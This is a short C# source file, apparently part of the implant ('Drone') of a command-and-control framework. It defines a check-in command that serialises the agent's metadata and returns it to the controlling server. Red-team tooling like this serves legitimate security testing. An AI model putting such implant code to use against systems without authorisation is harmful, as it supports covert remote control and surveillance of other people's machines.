using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class CheckIn : DroneCommand
{
    public override byte Command => 0x01;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        await Drone.SendDroneTaskOutput(new DroneTaskResponse
        {
            TaskId = task.Id,
            Module = 0x1E,
            Status = DroneTaskStatus.Complete,
            Output = Drone.Metadata.Serialize()
        });
    }
}